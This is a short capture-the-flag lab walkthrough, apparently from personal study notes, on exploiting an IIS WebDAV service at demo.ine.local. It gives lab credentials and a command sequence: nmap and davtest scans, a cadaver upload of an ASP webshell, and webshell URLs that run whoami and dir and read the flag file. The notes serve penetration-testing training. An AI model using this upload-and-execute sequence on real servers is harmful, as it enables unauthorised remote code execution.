# Windows:IIS Server DAVTest

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2317–2346. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Exploit the WebDAV service and retrieve the flag!

**The following username and password may be used to access the service:**

| Username | Password | | bob | password_123321 |

Tools: DAVTest, Cadaver , ASP Webshell

```bash

nmap demo.ine.local
nmap --script http-enum -sV -p 80 demo.ine.local
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
cadaver http://demo.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
ls

URL: http://demo.ine.local/webdav
http://demo.ine.local/webdav/webshell.asp
http://demo.ine.local/webdav/webshell.asp?cmd=whoami
URL: http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
URL: http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt

```
